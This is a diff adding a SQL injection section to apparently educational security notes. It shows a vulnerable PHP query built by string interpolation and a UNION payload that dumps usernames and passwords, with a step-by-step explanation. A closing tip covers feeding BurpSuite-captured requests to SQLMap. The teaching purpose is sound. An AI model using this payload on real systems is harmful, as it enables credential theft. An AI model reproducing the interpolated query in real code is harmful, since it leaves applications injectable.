@@ -26,6 +26,60 @@ Note that even if you can insert a path, you should start the SQL console inside
 * `DESCRIBE <table>`: see the structure of `<table>`
 </div></div>
 
+<hr class="sr">
+
+## SQL Injections
+
+<div class="row row-cols-md-2"><div>
+
+Most websites are using SQL database to store records. For instance, when using a login form, the username will most likely be used to fetch a user, then there will be a check of the password.
+
+In some cases, SQL injections are possible. It means that instead of providing our username, we will provide some SQL code that will be injected in the SQL request, and allow a hacker to access the database via the login form.
+
+**Example of injectable PHP code**: this code is fetching a list of products matching the product name send by the client.
+
+```php
+$sql = "Select name,desc from product where name LIKE '%$name%'";
+```
+
+If the user enter the following value instead of a product name
+
+```php
+' UNION Select username,password FROM users-- -
+```
+
+Then, the SQL query that will be executed will be
+
+```sql
+Select name,desc from product where name LIKE '%' UNION Select username,password FROM users-- -%'
+```
+
+Notice that now, the query will return a list of product, concatenated with a list of usernames/password!
+</div><div>
+
+**Explanation**
+
+**Inject `'`**: because we want to close the "Like", and avoid an error `[...] LIKE '%`.
+
+```sql
+Select name,desc from product where name LIKE '%'%'
+```
+
+**1. Inject `' --`**: the problem, is that now the query won't work, because we have 3 single quotes, and there is a trailing `%`. So, what we do is commenting the rest of the query.
+
+```sql
+Select name,desc from product where name LIKE '%' --%'
+```
+
+**2. Inject `'-- -`**:  The code above may not work on some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add ` -`, to ensure that there is a space.
+
+```sql
+Select name,desc from product where name LIKE '%' -- -%'
+```
+
+**3. Have fun**: between `'%'` and `-- -%'`, we can write SQL code, through the syntax of the final query must be valid. In the example, we used `UNION Select username,password FROM users`, which is used to merge results of two queries.
+</div></div>
+
 <hr class="sl">
 
 ## SQLMap
@@ -67,3 +121,5 @@ Notes
 
 > [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
 </div></div>
+
+> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, it may bypass it.
